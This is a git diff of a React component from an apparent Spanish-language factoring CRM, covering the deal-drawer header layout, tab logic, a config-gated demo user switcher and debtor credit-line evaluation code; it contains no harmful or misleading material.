-                <div className="mt-0.5 t13"><span className="font-semibold" style={{ color: C.ink }}>{deal.cliente}</span> <span style={{ color: C.sub }}>· {deal.id} · {STAGES[stageIdx].name}</span></div>
-                <div className="mt-1.5 flex flex-wrap gap-1.5">
-                  <Pill style={{ backgroundColor: TAG_COLORS[deal.tag]?.bg, color: TAG_COLORS[deal.tag]?.fg }}>{deal.tag}</Pill>
-                  {deal.cat && (() => { const cd = catDisp(deal); return <Pill style={{ backgroundColor: catMeta(cd.cat).bg, color: catMeta(cd.cat).fg }}>{cd.label} · {cd.q}</Pill>; })()}
-                </div>
-              </div>
+            )}
+          </div>
+          {/* El nombre del cliente manda: 22px semibold, con el folio y la etapa a su lado en gris
+              y en el cuerpo de texto. Antes iba a 16px, del mismo tamaño que el resto del panel. */}
+          <div className="mt-1 flex items-center justify-between gap-3">
+            <div className="flex min-w-0 items-center gap-3">
+              <span className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg font-semibold text-white" style={{ backgroundColor: C.indigo, fontSize: 14 }}>{(deal.cliente || "?")[0]}</span>
+              {tienePrioridadCurse(deal.id) && <span className="shrink-0" title={`Prioridad de curse solicitada por ${PRIORIDAD_CURSE[deal.id].porNombre}`}><Star size={16} style={{ color: "#C2410C", fill: "#F97316" }} /></span>}
+              <h1 className="font-semibold" style={{ color: C.ink, fontSize: 22, lineHeight: 1.2 }}>{deal.cliente}</h1>
+              <span className="truncate" style={{ color: C.sub, fontSize: 15 }}>· {deal.id} · {STAGES[stageIdx].name}</span>
             </div>
             {fullPage ? (
-              <div className="flex items-center gap-2.5">
+              <div className="flex shrink-0 items-center gap-2" title={onCambiarUsuario ? "Sólo demo: cambia la identidad de la sesión sin verificación" : undefined}>
                 <User size={16} style={{ color: C.faint }} />
-                <div className="flex items-center justify-between gap-6 rounded-lg px-3 py-1.5" style={{ border: `1px solid ${C.line}`, minWidth: 180 }}><span className="t12" style={{ color: C.ink }}>{USERS[usuario] || usuario}</span><ChevronDown size={14} style={{ color: C.faint }} /></div>
-                <span className="flex h-9 w-9 items-center justify-center rounded-lg t12 font-bold text-white" style={{ backgroundColor: C.indigo }}>{(USERS[usuario] || usuario).split(" ").map((p) => p[0]).slice(0, 2).join("").toUpperCase()}</span>
+                {onCambiarUsuario && CFG_ACTIVA.modoDemo !== false && CFG_ACTIVA.demoSuplantarUsuario !== false ? (
+                  <select value={usuario} onChange={(e) => onCambiarUsuario(e.target.value)} title="Sesión de usuario (sólo demo)"
+                    className="rounded-lg px-2 py-1.5 t12 font-medium" style={{ border: `1px solid ${C.line}`, color: C.ink, backgroundColor: "#fff", minWidth: 180 }}>
+                    {Object.entries(USERS).map(([k, n]) => <option key={k} value={k}>{n}</option>)}
+                  </select>
+                ) : (
+                  <span className="t12 font-medium" style={{ color: C.ink }}>{USERS[usuario] || usuario}</span>
+                )}
               </div>
             ) : (
-              <button onClick={onClose} className="rounded-md p-1 hover:bg-stone-100"><X size={18} style={{ color: C.sub }} /></button>
+              <button onClick={onClose} className="shrink-0 rounded-md p-1 hover:bg-stone-100"><X size={18} style={{ color: C.sub }} /></button>
             )}
+          </div>
+          <div className="mt-2 flex flex-wrap gap-1.5">
+            <Pill style={{ backgroundColor: TAG_COLORS[deal.tag]?.bg, color: TAG_COLORS[deal.tag]?.fg }}>{deal.tag}</Pill>
+            {deal.cat && (() => { const cd = catDisp(deal); return <Pill style={{ backgroundColor: catMeta(cd.cat).bg, color: catMeta(cd.cat).fg }}>{cd.label} · {cd.q}</Pill>; })()}
+            {/* `deal.exec` guarda las INICIALES; el nombre vive en PC_EXECS. */}
+            {deal.exec && <Pill style={{ backgroundColor: "#F9FAFB", color: C.sub, border: `1px solid ${C.line}` }}>{(PC_EXECS.find((e) => e.ini === deal.exec) || {}).nombre || deal.exec}</Pill>}
           </div>
           {/* Tabs y acciones comparten la línea: los tabs ocupan sólo su ancho y las acciones quedan
               inline a la derecha, sobre la misma divisoria. */}
           <div className="mt-3 flex flex-wrap items-end justify-between gap-x-6 gap-y-2" style={{ borderBottom: `1px solid ${C.line}` }}>
             <div className="flex flex-wrap items-center gap-x-5 gap-y-1">
-              {[["negocio", "Negocio"], ["contacto", "Linea"], ...(puedeVerBitacora(usuario) ? [["bitacora", "Bitácora"]] : []), ["sow", "SOW"], ...(puedeVerCobranza(usuario) ? [["cobranza", "Cobranza"]] : []), ...(puedeVerMensajeria(usuario) ? [["mensajeria", "Mensajería"]] : []), ...((deal.stage === "otorgamiento" || (deal.stage === "perdida" && (deal.perdidaOtorg || (deal.bloqueosFirmes && deal.bloqueosFirmes.length))) || (["prospeccion", "oferta", "aceptadas"].includes(deal.stage) && (() => { const v = visadoDeal(deal); return requiereOtorgamiento(deal) || v.exc.length || v.rech.length; })())) ? [["otorgamiento", "Otorgamiento"]] : [])].map(([k, l]) => { const on = tab === k; return (
+              {[["negocio", "Negocio"], ...(puedeVerBitacora(usuario) ? [["bitacora", "Bitácora"]] : []), ...(puedeVerCobranza(usuario) ? [["cobranza", "Cobranza"]] : []), ...(puedeVerMensajeria(usuario) ? [["mensajeria", "Mensajería"]] : []), ...((deal.stage === "otorgamiento" || (deal.stage === "perdida" && (deal.perdidaOtorg || (deal.bloqueosFirmes && deal.bloqueosFirmes.length))) || (["prospeccion", "oferta", "aceptadas"].includes(deal.stage) && (() => { const v = visadoDeal(deal); return requiereOtorgamiento(deal) || v.exc.length || v.rech.length; })())) ? [["otorgamiento", "Otorgamiento"]] : [])].map(([k, l]) => { const on = tab === k; return (
                 <button key={k} onClick={() => setTab(k)} className="flex items-center gap-1.5 px-1 pb-2 t12" style={{ borderBottom: `2px solid ${on ? C.indigo : "transparent"}`, color: on ? C.indigo : C.sub, fontWeight: on ? 600 : 400, marginBottom: -1 }}>
                   {l}
-                  {k === "otorgamiento" && otorgPend > 0 && <span title={`${otorgPend} regla(s) que debes visar tú (cliente + deudores)`} className="flex h-4 min-w-4 items-center justify-center rounded-full px-1 t9 font-bold text-white" style={{ backgroundColor: "#DC2626" }}>{otorgPend}</span>}
+                  {k === "otorgamiento" && otorgPendOp > 0 && <span title={otorgPend > 0 ? `${otorgPendOp} criterio(s) de otorgamiento pendientes · ${otorgPend} que debes visar tú` : `${otorgPendOp} criterio(s) de otorgamiento pendientes en esta operación`} className="flex h-4 min-w-4 items-center justify-center rounded-full px-1 t9 font-bold text-white" style={{ backgroundColor: otorgPend > 0 ? "#EF4444" : "#7C3AED" }}>{otorgPendOp}</span>}
                 </button>
               ); })}
             </div>
             <div className="flex flex-wrap items-center justify-end gap-2 pb-2">
               {(() => {
+                // Aceptada la oferta, la operación entra al proceso de excepción por sí sola (la
+                // bandeja de otorgamiento la toma sin que nadie la envíe): la pre-evaluación sólo
+                // existe ANTES de la aceptación, para adelantar el otorgamiento con los apoderados.
+                if (["aceptadas", "cesion", "otorgamiento", "giro"].includes(deal.stage) || aprobacionFormalCliente(deal)) return null;
                 const on = tienePreEval(deal.id);
                 // Envío explícito al proceso de excepción. Si hay excepciones pendientes sin comentario/respaldo
                 // del ejecutivo, primero se advierte con un diálogo (puede enviar igual tras el warning).
@@ -4948,21 +5739,23 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                   <button onClick={onClickPreEval} title={on ? "Cancelar la solicitud de pre-evaluación de otorgamiento" : "Enviar la operación al proceso de excepción (pre-evaluación de otorgamiento)"} className="inline-flex items-center gap-1.5 rounded-lg px-3 py-2 t12 font-medium" style={{ border: `1px solid ${on ? "#c4b5fd" : C.line}`, backgroundColor: on ? "#f5f3ff" : "#fff", color: on ? "#7C3AED" : C.sub }}><ShieldCheck size={14} style={{ color: on ? "#7C3AED" : C.faint }} /> Pre-evaluación</button>
                 );
               })()}
-              {(() => {
-                const on = tienePrioridadCurse(deal.id);
-                const puede = esJefeComercial(usuario); // jefaturas/gerencia solicitan; ejecutivo solo la ve
-                return (
-                  <button onClick={puede ? () => { setPrioridadCurse(deal.id, usuario, !on); setReevTick((x) => x + 1); } : undefined} title={puede ? (on ? "Quitar prioridad de curse" : "Solicitar prioridad de curse al ejecutivo") : (on ? `Prioridad de curse solicitada por ${PRIORIDAD_CURSE[deal.id].porNombre}` : "La prioridad de curse la solicita una jefatura")} className="inline-flex items-center gap-1.5 rounded-lg px-3 py-2 t12 font-medium" style={{ border: `1px solid ${on ? "#FED7AA" : C.line}`, backgroundColor: on ? "#FFF7ED" : "#fff", color: on ? "#C2410C" : C.sub, cursor: puede ? "pointer" : "default" }}><Star size={14} style={{ color: on ? "#C2410C" : C.faint, fill: on ? "#F97316" : "none" }} /> Prioridad</button>
-                );
-              })()}
-              {fullPage && accionesBar}
+              {/* La prioridad se ve como estrella junto al nombre del cliente y se cambia desde el
+                  menú de acciones; ya no necesita un botón propio compitiendo en el encabezado.
+                  El menú sólo aparece acá cuando la tarjeta de veredicto —que lo lleva incorporado—
+                  no está en pantalla, para que ninguna pestaña se quede sin las acciones. */}
+              {fullPage && !(tab === "negocio" && negTab === "detalle") && (
+                <div className="relative">
+                  <button onClick={() => setAccMenu((v) => !v)} className="inline-flex items-center gap-1.5 rounded-lg px-3 py-2 t12 font-medium text-white" style={{ backgroundColor: C.ink }}>Acciones <ChevronDown size={14} /></button>
+                  {accMenu && panelAcciones(false)}
+                </div>
+              )}
             </div>
           </div>
         </div>
         <div className={fullPage ? "p-5" : "flex-1 overflow-y-auto p-5"}>
           {/* Proceso en background (socket): llegaron facturas nuevas del cliente y el backend está
               re-simulando la oportunidad. La UI lo informa sin bloquear la navegación. */}
-          {deal.actualizando && (
+          {deal.actualizando && !fullPage && (
             <div className="mb-3 flex items-start gap-2.5 rounded-xl p-3" style={{ backgroundColor: "#F5F3FF", border: "1px solid #DDD6FE" }}>
               <RotateCcw size={15} className="pl-spin" style={{ color: "#7C3AED", marginTop: 1 }} />
               <div>
@@ -4989,7 +5782,7 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
               <div className="mt-4 space-y-3">
                 {deal.stage === "perdida" && (
                   <div className="rounded-lg p-3" style={{ backgroundColor: "#fef2f2", border: "1px solid #fecaca" }}>
-                    <div className="flex items-center gap-1.5 t11 font-semibold uppercase tracking-wide" style={{ color: "#DC2626" }}><X size={12} /> ⛔ Operación perdida{deal.bloqueosFirmes && deal.bloqueosFirmes.length ? ` · ${deal.bloqueosFirmes.length} bloqueo(s) firme(s): ${deal.bloqueosFirmes.map((n) => "#" + n).join(", ")}` : ""}{deal.fechaPerdida ? ` · ${deal.fechaPerdida}` : ""}</div>
+                    <div className="flex items-center gap-1.5 t11 font-semibold uppercase tracking-wide" style={{ color: "#EF4444" }}><X size={12} /> ⛔ Operación perdida{deal.bloqueosFirmes && deal.bloqueosFirmes.length ? ` · ${deal.bloqueosFirmes.length} bloqueo(s) firme(s): ${deal.bloqueosFirmes.map((n) => "#" + n).join(", ")}` : ""}{deal.fechaPerdida ? ` · ${deal.fechaPerdida}` : ""}</div>
                     <div className="mt-1.5 t12" style={{ color: C.ink, lineHeight: 1.5 }}>{causaPerdidaDeal(deal)}. Estado terminal: los bloqueos firmes <b>no admiten excepción</b> por ningún nivel de atribución. El historial de versiones queda en <b>solo lectura</b>. Para reactivar el negocio se crea una operación nueva con referencia a ésta.</div>
                   </div>
                 )}
@@ -5050,7 +5843,7 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                   </div>
                   {/* Barra: uso actual + esta operación vs línea aprobada */}
                   <div className="mt-2 flex h-3 w-full overflow-hidden rounded-full" style={{ backgroundColor: "#E5E7EB" }}>
-                    <div style={{ width: `${usoPct}%`, backgroundColor: usoPct > 95 ? "#DC2626" : usoPct > 80 ? "#F97316" : "#703EFF" }} />
+                    <div style={{ width: `${usoPct}%`, backgroundColor: usoPct > 95 ? "#EF4444" : usoPct > 80 ? "#F97316" : "#703EFF" }} />
                     <div style={{ width: `${opPct}%`, backgroundColor: lc.fueraDeLinea ? C.amber : C.indigo }} />
                     {overPct > 0 && <div style={{ width: `${overPct}%`, backgroundColor: C.red }} />}
                   </div>
@@ -5068,23 +5861,6 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
           </>)}
 
           {tab === "negocio" && (<>
-          {/* Resumen IA de la operación — colapsable (colapsado por defecto para no ocupar viewport). */}
-          <div className="mb-4 rounded-lg" style={{ backgroundColor: "#f5f3ff", border: "1px solid #DDD6FE" }}>
-            <button onClick={() => setIaOpen((v) => !v)} className="flex w-full items-center justify-between gap-2 p-3 text-left">
-              <span className="flex items-center gap-1.5 t11 font-semibold uppercase tracking-wide" style={{ color: "#7C3AED" }}><Zap size={12} /> Resumen IA de la operación</span>
-              <span className="flex items-center gap-1 t9" style={{ color: "#7C3AED" }}>{iaOpen ? "Ocultar" : "Ver"} {iaOpen ? <ChevronUp size={14} /> : <ChevronDown size={14} />}</span>
-            </button>
-            {iaOpen && (
-              <div className="px-3 pb-3">
-                <div className="space-y-1.5">
-                  {resumenIA(deal).map((p, i) => (
-                    <p key={i} className="t12" style={{ color: C.ink, lineHeight: 1.55 }}>{p}</p>
-                  ))}
-                </div>
-                <div className="mt-2 t9" style={{ color: C.faint }}>Generado automáticamente a partir del historial de la oportunidad (prospección → estado actual).</div>
-              </div>
-            )}
-          </div>
           {/* Simulación del negocio: condiciones, deudores y facturas de la operación. */}
           {(() => {
                   const deudoresUnicos = [...new Set(facturasOp.map((f) => f.deudor))];
@@ -5129,20 +5905,11 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                   const oferta = tasaPond; // tasa de la operación (efectiva)
                   const inputCls = "w-20 rounded-md px-2 py-1 t11 text-right outline-none disabled:opacity-60 disabled:cursor-not-allowed";
                   const bloqueado = ["aceptadas", "cesion", "giro", "perdida"].includes(deal.stage);
-                  return (
-                    <div className="mt-4">
-                      <div className="flex items-center justify-between gap-1.5 t11 font-semibold" style={{ color: "#C2410C" }}><span className="flex items-center gap-1.5"><MessageSquare size={12} /> Simulación</span>{bloqueado && <span className="rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: C.greenBg, color: C.green }}>🔒 Aceptada · bloqueada</span>}</div>
-                      {bloqueado && <div className="mt-1 t9" style={{ color: C.sub }}>La operación ya fue aceptada formalmente: no se pueden modificar las condiciones ni agregar/retirar facturas.</div>}
-                      {/* Sub-tabs del negocio. Cuáles se muestran es configuración del tenant
-                          (Configuración › Funcionalidades), no una decisión del código: «Resumen»
-                          siempre está; los demás se habilitan por factoring. */}
-                      <div className="mt-2 flex flex-wrap items-center gap-1.5">
-                        {[["resumen", "Resumen", true], ["documentos", "Documentos", CFG_ACTIVA.tabDocumentos], ["detalle", "Detalle", CFG_ACTIVA.tabDetalle], ["descuentos", "Descuentos", CFG_ACTIVA.tabDescuentos]].filter(([, , on]) => on !== false).map(([k, l]) => (
-                          <button key={k} onClick={() => setNegTab(k)} className="rounded-lg px-3 py-1.5 t11 font-semibold" style={{ backgroundColor: negTab === k ? C.lilac : "#fff", color: negTab === k ? C.indigo : C.sub, border: `1px solid ${negTab === k ? C.indigo : C.line}` }}>{l}</button>
-                        ))}
-                      </div>
-                      {/* Resumen de condiciones comerciales (referencia read-only) — se mantiene visible en Documentos y Descuentos. */}
-                      {negTab !== "resumen" && (() => {
+                  // El resumen de condiciones comerciales se guarda en una variable en vez de
+                  // renderizarse en el sitio: en el sub-tab Detalle va DEBAJO de la tarjeta de
+                  // veredicto —la respuesta de la pantalla manda, la tarifa es apoyo— y en los
+                  // demás sigue encabezando el contenido.
+                  const condComerciales = negTab === "resumen" ? null : (() => {
                         const UF = CFG_ACTIVA.valorUF, comMiniCLP = CFG_ACTIVA.comisionUF * UF, gastMiniCLP = CFG_ACTIVA.gastosCLP; // condiciones base del factoring (configurables)
                         const bRef = bandaDescuentoDeTasa(tasaPond);
                         return (
@@ -5159,8 +5926,19 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                             {bRef && <div className="mt-1.5 t9" style={{ color: C.faint }}>Atribución (banda tasa {bRef.tMin}%–{bRef.tMax === Infinity ? "+" : bRef.tMax + "%"}): descuento ejecutivo <b style={{ color: C.sub }}>{bRef.descEjec}%</b> · máximo con jefatura <b style={{ color: C.sub }}>{bRef.descMax}%</b> · sobre el máximo requiere Gerente Comercial. Edita las condiciones en el sub-tab <b style={{ color: C.sub }}>Resumen</b>.</div>}
                           </div>
                         );
-                      })()}
-                      {negTab === "resumen" && <SimResumen deal={deal} o={o} montoDocs={montoValido} cantFacturas={validas.length} usuario={USERS[usuario] || usuario} bloqueado={bloqueado} antic={antic} setAntic={setAntic} comisO={comisO} setComisO={setComisO} tasaPond={tasaPond} diasPond={diasPond} reevalPend={reevalPend} onReevaluar={() => setReevalPend(false)} esJefe={esJefeComercial(usuario)} usuarioCod={usuario} deudoresOp={validas} tasaFuente={{ usaUltNeg, riesgo: tasaPondRiesgo, ultNeg: tul }} />}
+                  })();
+                  return (
+                    <div className="mt-4">
+                      {/* El rótulo «Simulación» y los sub-tabs salieron de acá: Detalle quedó siendo la
+                          vista completa —veredicto, condiciones, deudores y facturas disponibles—, así
+                          que el rótulo no decía nada que las propias secciones no digan y el grupo de
+                          pills ofrecía una navegación de un solo destino útil. El aviso de operación
+                          bloqueada se queda: es estado, no navegación. */}
+                      {bloqueado && (<>
+                        <div><span className="rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: C.greenBg, color: C.green }}>🔒 Aceptada · bloqueada</span></div>
+                        <div className="mt-1 t9" style={{ color: C.sub }}>La operación ya fue aceptada formalmente: no se pueden modificar las condiciones ni agregar/retirar facturas.</div>
+                      </>)}
+                      {negTab !== "detalle" && condComerciales}
                       {negTab === "descuentos" && <SimDescuentos deal={deal} o={o} />}
                       {negTab === "documentos" && (<>
                       {/* Documentos: facturas incluidas en la oferta */}
@@ -5187,7 +5965,7 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                             <span className="text-right font-semibold" title={`Nota del deudor: ${nota} / 5`} style={{ color: NOTA_COLOR(nota) }}>{nota}</span>
                             <span className="t9" style={{ color: C.faint }}>{em}</span>
                             <input type="date" disabled={bloqueado} value={vencFecha[f.id] || ""} onChange={(e) => setVencFecha((m) => ({ ...m, [f.id]: e.target.value }))} title="Fecha de vencimiento (editable)" className="rounded-full px-1 py-0.5 t9 outline-none disabled:opacity-60" style={{ border: `1px solid ${C.line}`, color: C.ink, backgroundColor: "#fff" }} />
-                            {og.total === 0 ? <span className="justify-self-start t10" style={{ color: C.faint }}>—</span> : <span className="inline-flex items-center gap-1 justify-self-start t10 font-bold" title={og.allOk ? `Todas las reglas de otorgamiento del deudor cumplieron (${og.ok}/${og.total})` : `${og.ok} de ${og.total} reglas de otorgamiento cumplieron · ${og.total - og.ok} pendiente(s)`} style={{ cursor: "help" }}><span style={{ color: og.allOk ? "#16A34A" : "#DC2626" }}>{og.allOk ? "✓" : "⚠"}</span><span style={{ fontVariantNumeric: "tabular-nums" }}><span style={{ color: og.allOk ? "#16A34A" : "#DC2626" }}>{og.ok}</span><span style={{ color: C.sub }}>/{og.total}</span></span></span>}
+                            {og.total === 0 ? <span className="justify-self-start t10" style={{ color: C.faint }}>—</span> : <span className="inline-flex items-center gap-1 justify-self-start t10 font-bold" title={og.allOk ? `Todas las reglas de otorgamiento del deudor cumplieron (${og.ok}/${og.total})` : `${og.ok} de ${og.total} reglas de otorgamiento cumplieron · ${og.total - og.ok} pendiente(s)`} style={{ cursor: "help" }}><span style={{ color: og.allOk ? "#16A34A" : "#EF4444" }}>{og.allOk ? "✓" : "⚠"}</span><span style={{ fontVariantNumeric: "tabular-nums" }}><span style={{ color: og.allOk ? "#16A34A" : "#EF4444" }}>{og.ok}</span><span style={{ color: C.sub }}>/{og.total}</span></span></span>}
                             <span className="justify-self-start rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: vv.bg, color: vv.fg }}>{vv.t}</span>
                             <span className="text-right font-medium" style={{ color: C.ink }}>{tasaF}%</span>
                             <span className="text-right font-medium" style={{ color: C.ink }}>{fmtMM(f.montoMM)}</span>
@@ -5351,9 +6129,14 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                       {negTab === "detalle" && (() => {
                         // Estado de carga: mientras se resuelven las consultas por deudor (o mientras el
                         // backend re-simula la oportunidad por facturas nuevas) se muestra el esqueleto.
-                        if (detCargando || deal.actualizando) return (
+                        // `actualizando` sirve en el DRAWER, que vive en el mismo documento que el tubo
+                        // y ve cuando el proceso termina. La pagina completa es un SNAPSHOT del deal al
+                        // momento de abrirla: ahi la marca no se limpia nunca y dejaba el detalle en
+                        // esqueleto para siempre. Ademas la corrida ya no re-simula: las facturas nuevas
+                        // solo engrosan el pool disponible, y eso no obliga a esconder la pantalla.
+                        if (detCargando || (deal.actualizando && !fullPage)) return (
                           <div className="mt-3">
-                            <div className="t10 uppercase tracking-wide" style={{ color: C.faint }}>{deal.actualizando ? "Actualizando deudores de la oferta…" : "Cargando deudores de la oferta…"}</div>
+                            <div className="t10 uppercase tracking-wide" style={{ color: C.faint }}>{deal.actualizando && !fullPage ? "Actualizando deudores de la oferta…" : "Cargando deudores de la oferta…"}</div>
                             <div className="mt-2"><SkeletonDeudores n={3} /></div>
                           </div>
                         );
@@ -5371,37 +6154,143 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
                         const dq = detQuery.trim().toLowerCase();
                         const matchDeu = (dn, grupo) => !dq || dn.toLowerCase().includes(dq) || grupo.some((f) => String(f.folio).includes(dq));
                         const deudOfF = deudOf.filter((dn) => matchDeu(dn, grpOf[dn]));
-                        const deudOtF = deudOt.filter((dn) => matchDeu(dn, grpOt[dn]));
+                        const enOfertaSet = new Set(deudOf);
+                        const deudOtF = deudOt.filter((dn) => !enOfertaSet.has(dn) && matchDeu(dn, grpOt[dn]));
+                        // Las dos secciones se leen igual —deudores, facturas y monto—, así que la de
+                        // disponibles necesita sus propios totales. Se cuentan los deudores que de verdad
+                        // se listan (los que ya están en la oferta suben arriba), sin el filtro del
+                        // buscador: el chip describe el pool, no la búsqueda.
+                        const deudOtVis = deudOt.filter((dn) => !enOfertaSet.has(dn));
+                        const facsOt = deudOtVis.reduce((s, dn) => s + (grpOt[dn] || []).length, 0);
+                        const montoOt = +deudOtVis.reduce((s, dn) => s + (grpOt[dn] || []).reduce((s2, f) => s2 + (f.montoMM || 0), 0), 0).toFixed(1);
                         // Paginación de «Otras facturas disponibles»: 20 deudores por página.
                         const OT_PP = 20; const otTotalPg = Math.max(1, Math.ceil(deudOtF.length / OT_PP)); const otPg = Math.min(detOtrasPage, otTotalPg - 1);
                         const deudOtPage = deudOtF.slice(otPg * OT_PP, otPg * OT_PP + OT_PP);
                         // RUT del deudor: el de la operación si existe; si no, uno determinístico por nombre.
                         const rutMap = {}; deudoresDeDeal(deal).forEach((d) => { if (d.rut) rutMap[d.nombre] = d.rut; });
                         const rutDe = (n) => { if (rutMap[n]) return rutMap[n]; const h = Math.abs(hashStr("rut:" + n)); return `${76 + h % 20}.${String(100 + h % 900)}.${String(h % 1000).padStart(3, "0")}-${"0123456789K"[h % 11]}`; };
-                        // Línea de crédito del DEUDOR (determinística por nombre): aprobada / uso / disponible en MM$.
-                        const lineaDeudor = (n) => { const h = Math.abs(hashStr("ldeu:" + n)); const aprobada = 120 + (h % 24) * 20; const uso = Math.round(aprobada * (0.25 + (Math.floor(h / 16) % 50) / 100)); return { aprobada, uso, disponible: aprobada - uso }; };
+                        // EVALUACIÓN DE LÍNEA de la oferta: el motor completo sobre los tres niveles, no una
+                        // estimación por deudor. Se recalcula la operación ENTERA porque la línea del cliente se
+                        // consume acumulativamente en orden de nota y la línea de otros deudores es compartida,
+                        // agregar un deudor de mejor nota puede cambiar el resultado de todos los de atrás.
+                        // Con `reevalPend` activo NO se calcula: la selección cambió y el ejecutivo todavía no
+                        // pidió re-evaluar. Ver la tarjeta de veredicto.
+                        const evalLin = reevalPend ? null : asignarLineas(validas, deal.rutEmisor);
+                        // El motor agrupa por RUT del deudor (§3.4) y estos acordeones por razón social. Si un
+                        // mismo nombre llega con más de un RUT, quedarse con el último grupo mostraría «1 de 1
+                        // con línea» en una fila que tiene cuatro facturas. Se agregan.
+                        const evalDeu = {};
+                        if (evalLin) evalLin.deudores.forEach((d) => {
+                          const p = evalDeu[d.nombre];
+                          if (!p) { evalDeu[d.nombre] = d; return; }
+                          const nCL = p.nConLinea + d.nConLinea, nF = p.nFacturas + d.nFacturas;
+                          // Los TOPES y el desglose se fusionan igual que los montos. Antes se concatenaban
+                          // sólo las líneas usadas y se conservaban los topes del primer grupo: el panel
+                          // decía «se asigna de la Línea Cliente - Otros Deudores» y listaba abajo una
+                          // Puntual y una Normal usadas —justo lo que el modelo prohíbe— cuando en realidad
+                          // eran dos RUT distintos bajo la misma razón social.
+                          const topes = ["par", "cliente", "deudor"].map((n) => {
+                            const a = (p.topes || []).find((t) => t.nivel === n), b = (d.topes || []).find((t) => t.nivel === n);
+                            if (!a) return b; if (!b) return a;
+                            return b.disponible < a.disponible ? b : a; // manda el más restrictivo
+                          }).filter(Boolean);
+                          // La clave lleva el RUT: dos razones sociales iguales con RUT distinto tienen
+                          // líneas distintas del mismo tipo, y deduplicar por etiqueta escondía una.
+                          const detallePar = (() => {
+                            const m = new Map();
+                            [...(p.detallePar || []), ...(d.detallePar || [])].forEach((x) => {
+                              const k = x.id || ((x.rut || "") + "|" + x.label);
+                              const cur = m.get(k);
+                              // Misma línea vista por los dos grupos: el uso propio SUMA, el resto ya coincide.
+                              if (cur) cur.usadoDeudor = +((cur.usadoDeudor || 0) + (x.usadoDeudor || 0)).toFixed(1);
+                              else m.set(k, { ...x });
+                            });
+                            return [...m.values()];
+                          })();
+                          evalDeu[d.nombre] = { ...p, seleccionado: +(p.seleccionado + d.seleccionado).toFixed(1), asignado: +(p.asignado + d.asignado).toFixed(1),
+                            nConLinea: nCL, nFacturas: nF, holgura: Math.min(p.holgura, d.holgura),
+                            estado: nCL === 0 ? "sin_linea" : nCL === nF ? "con_linea" : "parcial",
+                            topes, manda: topes.reduce((a, b) => (b.disponible < a.disponible ? b : a), topes[0]), detallePar,
+                            lineasUsadas: p.lineasUsadas.concat(d.lineasUsadas) };
+                        });
+                        const evalFac = {}; if (evalLin) evalLin.facturas.forEach((f) => { evalFac[f.id] = f; });
+                        // Línea que le queda a cada deudor y cuánto de sus facturas disponibles entraría
+                        // dentro de ella. Se corre el motor deudor por deudor (oferta + SUS facturas) y no
+                        // todos juntos: comparten la línea del cliente, así que en bloque se pisan entre sí
+                        // y cada uno se vería más chico de lo que puede sumar. Asignarle `a` a un deudor
+                        // descuenta `a` de sus tres topes, así que la holgura baja exactamente `a`: de ahí
+                        // que la línea disponible de HOY sea la holgura posterior más lo que entraría.
+                        // Línea disponible de cada deudor, SIN descontar lo ya seleccionado: la línea es un
+                        // atributo del deudor en el sistema y no se consume hasta que la operación se cursa.
+                        // Se corre el motor con las facturas de ESE deudor y nada más —así no se la comen ni
+                        // el resto de los deudores ni la oferta— y como asignar `a` descuenta `a` de sus tres
+                        // topes, `holgura + asignado` reconstruye exactamente la línea libre inicial.
+                        const lineaDeudor = {};
+                        if (deal.rutEmisor) {
+                          new Set([...Object.keys(grpOf), ...Object.keys(grpOt)]).forEach((dn) => {
+                            const suyas = [...(grpOf[dn] || []), ...(grpOt[dn] || [])];
+                            if (!suyas.length) return;
+                            const dd = (asignarLineas(suyas, deal.rutEmisor).deudores || []).find((x) => x.nombre === dn);
+                            if (!dd) return;
+                            const fuera = (grpOt[dn] || []).filter((f) => estadoCandidata(f, deal).agregable);
+                            // Holgura NETA: lo que le queda con la oferta actual ya puesta. Es contra esto que
+                            // se decide si una factura suelta entra o se va a comité. Sin evaluación de línea
+                            // vigente (re-evaluación pendiente) no se calcula: el dato estaría desactualizado.
+                            let neta = null;
+                            if (evalLin) {
+                              const dn2 = (asignarLineas([...validas, ...suyas], deal.rutEmisor).deudores || []).find((x) => x.nombre === dn);
+                              const yaEnOferta = (evalDeu[dn] && evalDeu[dn].asignado) || 0;
+                              if (dn2) neta = +Math.max(0, dn2.holgura + Math.max(0, dn2.asignado - yaEnOferta)).toFixed(1);
+                            }
+                            lineaDeudor[dn] = { disponible: +(dd.holgura + dd.asignado).toFixed(1), neta,
+                              conLineaPropia: !!dd.conLineaPropia, manda: dd.manda ? dd.manda.label : null,
+                              nFuera: fuera.length, montoFuera: +fuera.reduce((s2, f) => s2 + (f.montoMM || 0), 0).toFixed(1) };
+                          });
+                        }
+                        // Las otras DOS compuertas de la operación. No cambian el monto cursable —eso lo decide
+                        // sólo la línea— pero sí deciden el momento: sin ellas resueltas la operación no gira.
+                        const otorgRes = (() => {
+                          const items = evaluarOtorgItems(deal);
+                          const total = items.length;
+                          const ok = items.filter((it) => it.disp === "aprobado" || it.disp === "clasificacion").length;
+                          // Sólo cuenta como «requiere acción» lo que el tab Otorgamiento considera pendiente:
+                          // excepciones sin visar, excepciones rechazadas y rechazos. Marcar cualquier regla no
+                          // aprobada dejaba el bloque «no requieren ninguna acción» siempre en cero, porque con
+                          // 23 reglas por deudor prácticamente todos tienen alguna en excepción ya resuelta.
+                          const v = visadoDeal(deal);
+                          const pend = [].concat(v.excPend || [], v.excRech || [], v.rechFirme || [], v.rechReev || []);
+                          let cliente = false; const malos = new Set();
+                          pend.forEach((x) => { if (x.deudor) malos.add(x.deudor.nombre); else cliente = true; });
+                          return { total, ok, cliente, deudores: [...malos], nPend: pend.length };
+                        })();
+                        const verifRes = (() => {
+                          const pend = validas.filter((f) => verifFactura(f, deal).est !== "ok");
